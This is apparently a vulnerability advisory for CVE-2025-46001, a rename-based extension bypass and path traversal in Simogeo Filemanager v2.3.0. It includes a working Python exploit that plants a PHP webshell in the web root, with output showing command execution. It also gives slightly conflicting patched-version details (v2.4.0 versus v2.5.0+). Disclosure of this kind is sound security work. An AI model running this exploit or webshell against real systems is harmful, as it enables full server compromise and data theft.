# CVE-2025-46001 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-46001
- **CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: Filemanager v2.3.0 and earlier
- **Vendor**: simogeo (https://github.com/simogeo/Filemanager)
- **Patched in**: v2.4.0 (project deprecated)

## Description

Simogeo Filemanager v2.3.0 contains a rename-based extension bypass vulnerability. The rename functionality lacks proper validation, allowing attackers to:

1. Upload a file with an allowed extension (e.g., `.txt`)
2. Rename the file to a dangerous extension (e.g., `.php`)
3. Use path traversal (`....//`) to move the file outside the protected `userfiles` directory

## Vulnerable Code

File: `connectors/php/filemanager.class.php`

The `rename()` function fails to properly validate:
1. The new file extension against the security policy
2. Path traversal attempts in the new filename

The path filter removes `"../"` but can be bypassed using `"....//"`  which becomes `"../"` after filtering.

## Exploitation Steps

1. Upload a `.txt` file containing PHP webshell code (allowed by default policy)
2. Call rename API with path traversal: `new=....//....//shell.php`
3. Filter removes `"../"` -> `"....//....//shell.php"` becomes `"../../shell.php"`
4. File is moved to web root and renamed to `.php`
5. Access webshell to execute arbitrary commands

## Proof of Concept

```python
import requests

target = "http://target:8086/filemanager"
php_code = '<?php system($_GET["cmd"]); ?>'

# Step 1: Upload .txt file
files = {'newfile': ('shell.txt', php_code, 'text/plain')}
data = {'mode': 'add', 'currentpath': '/filemanager/userfiles/'}
requests.post(f"{target}/connectors/php/filemanager.php", files=files, data=data)

# Step 2: Rename with path traversal + extension change
rename_url = f"{target}/connectors/php/filemanager.php?mode=rename&old=/filemanager/userfiles/shell.txt&new=....//....//shell.php"
requests.get(rename_url)

# Step 3: Access shell at web root
# http://target:8086/shell.php?cmd=id
```

## Verification Result

```
[+] Text file uploaded: shell_alepzcza.txt
[+] Rename with path traversal succeeded!
[*] Rename response: {"New Path":"\/filemanager\/userfiles\/..\/..\/shell_alepzcza.php"}
[+] VULNERABLE! RCE achieved via path traversal!
[+] Shell URL: http://localhost:8086/shell_alepzcza.php
[+] Command 'id' output:
CVE-2025-46001-VULNERABLEuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Impact

- **Remote Code Execution**: Unauthenticated attackers can execute arbitrary code
- **Full Server Compromise**: Complete control over the web server
- **Data Exfiltration**: Access to sensitive files and databases
- **Lateral Movement**: Pivot point for attacking internal systems

## Remediation

1. Upgrade to v2.5.0+ or migrate to RichFilemanager (official successor)
2. Validate file extensions during rename operations
3. Implement proper path traversal prevention
4. Keep `.htaccess` protection in upload directories

## References

- https://github.com/zakumini/CVE-List/blob/main/CVE-2025-46001/CVE-2025-46001.md
- https://www.exploit-db.com/exploits/38895
- https://github.com/simogeo/Filemanager
